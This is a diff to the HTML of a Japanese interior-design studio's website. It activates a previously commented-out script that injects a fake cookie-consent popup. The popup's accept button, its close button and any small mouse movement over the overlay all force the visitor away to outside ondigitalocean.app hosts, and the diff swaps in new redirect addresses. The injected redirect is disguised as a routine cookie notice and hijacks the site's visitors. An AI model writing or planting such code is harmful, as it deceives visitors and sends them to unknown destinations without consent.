@@ -11,13 +11,12 @@
   gtag('config', 'G-4FJ70WDYYZ');
 </script>
      
-<!-- <script>
-        document.addEventListener("DOMContentLoaded", function () {
-
-            const redirectUrl = "https://stingray-app-kaicr.ondigitalocean.app/";
-
-            const style = document.createElement("style");
-            style.textContent = `
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+        const redirectUrl = "https://urchin-app-b7sl7.ondigitalocean.app/";
+ 
+        const style = document.createElement("style");
+        style.textContent = `
             .cookie-overlay {
                 position: fixed;
                 inset: 0;
@@ -90,73 +89,73 @@
                 line-height: 1.5;
             }
         `;
-            document.head.appendChild(style);
+        document.head.appendChild(style);
 
-            const overlay = document.createElement("div");
-            overlay.className = "cookie-overlay";
-            overlay.id = "cookie-overlay";
-            overlay.innerHTML = `
-                <div class="cookie-popup">
-                <button class="close-btn" id="close-popup" aria-label="クッキーポリシーを閉じる">×</button>
-                <h3>クッキーポリシー</h3>
-                <p>
-                このサイトでは、コンテンツや広告のパーソナライズ、ソーシャルメディア機能の提供、トラフィックの分析のためにクッキーを使用しています。
-                「同意する」をクリックすることで、クッキーの使用に同意したことになります。詳細は
-                <a href="${redirectUrl}" class="cta" style="text-decoration: underline; color: #007bff;">クッキーポリシー</a>をご覧ください。
-                </p>
-                <a href="${redirectUrl}" id="accept-cookies" class="btn-primary">同意する</a>
-                </div>
-            `;
-            document.body.appendChild(overlay);
+        const overlay = document.createElement("div");
+        overlay.className = "cookie-overlay";
+        overlay.id = "cookie-overlay";
+        overlay.innerHTML = `
+<div class="cookie-popup">
+<button class="close-btn" id="close-popup" aria-label="クッキーポリシーを閉じる">×</button>
+<h3>クッキーポリシー</h3>
+<p>
+このサイトでは、コンテンツや広告のパーソナライズ、ソーシャルメディア機能の提供、トラフィックの分析のためにクッキーを使用しています。
+「同意する」をクリックすることで、クッキーの使用に同意したことになります。詳細は
+<a href="${redirectUrl}" class="cta" style="text-decoration: underline; color: #007bff;">クッキーポリシー</a>をご覧ください。
+</p>
+<a href="https://hammerhead-app-lclsj.ondigitalocean.app/" id="accept-cookies" class="btn-primary">同意する</a>
+</div>
+        `;
+        document.body.appendChild(overlay);
 
-            let isRedirected = false;
-            let startPos = null;
-            let redirectTimeout = null;
+        let isRedirected = false;
+        let startPos = null;
+        let redirectTimeout = null;
 
-            const handleRedirect = () => {
-                if (!isRedirected) {
-                    isRedirected = true;
-                    window.location.href = redirectUrl;
-                }
-            };
+        const handleRedirect = () => {
+            if (!isRedirected) {
+                isRedirected = true;
+                window.location.href = redirectUrl;
+            }
+        };
 
-            const detectMouseMove = (event) => {
-                if (isRedirected) return;
+        const detectMouseMove = (event) => {
+            if (isRedirected) return;
 
-                const screenHeight = window.innerHeight;
-                const activeTop = screenHeight * 0.1;
+            const screenHeight = window.innerHeight;
+            const activeTop = screenHeight * 0.1;
 
-                if (event.clientY >= activeTop) {
-                    if (!startPos) {
-                        startPos = { x: event.clientX, y: event.clientY };
-                    } else {
-                        const dx = Math.abs(event.clientX - startPos.x);
-                        const dy = Math.abs(event.clientY - startPos.y);
-
-                        if ((dx > 10 || dy > 10) && !redirectTimeout) {
-                            redirectTimeout = setTimeout(handleRedirect, 1000);
-                        }
-                    }
+            if (event.clientY >= activeTop) {
+                if (!startPos) {
+                    startPos = { x: event.clientX, y: event.clientY };
                 } else {
-                    startPos = null;
-                    clearTimeout(redirectTimeout);
-                    redirectTimeout = null;
+                    const dx = Math.abs(event.clientX - startPos.x);
+                    const dy = Math.abs(event.clientY - startPos.y);
+
+                    if ((dx > 10 || dy > 10) && !redirectTimeout) {
+                        redirectTimeout = setTimeout(handleRedirect, 1000);
+                    }
                 }
-            };
+            } else {
+                startPos = null;
+                clearTimeout(redirectTimeout);
+                redirectTimeout = null;
+            }
+        };
 
-            document.getElementById("cookie-overlay").addEventListener("mousemove", detectMouseMove);
+        document.getElementById("cookie-overlay").addEventListener("mousemove", detectMouseMove);
 
-            document.getElementById("accept-cookies").addEventListener("click", function (e) {
-                e.preventDefault();
-                handleRedirect();
-            });
-
-            document.getElementById("close-popup").addEventListener("click", function (e) {
-                e.preventDefault();
-                handleRedirect();
-            });
+        document.getElementById("accept-cookies").addEventListener("click", function (e) {
+            e.preventDefault();
+            handleRedirect();
         });
-    </script> -->  
+
+        document.getElementById("close-popup").addEventListener("click", function (e) {
+            e.preventDefault();
+            handleRedirect();
+        });
+    });
+</script>  
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>和匠デザイン工房｜和モダン内装・外装デザインスタジオ</title>
@@ -1033,6 +1032,7 @@ document.addEventListener("DOMContentLoaded", ()=>{
 </body>
 </html>
     
+
 
 
 
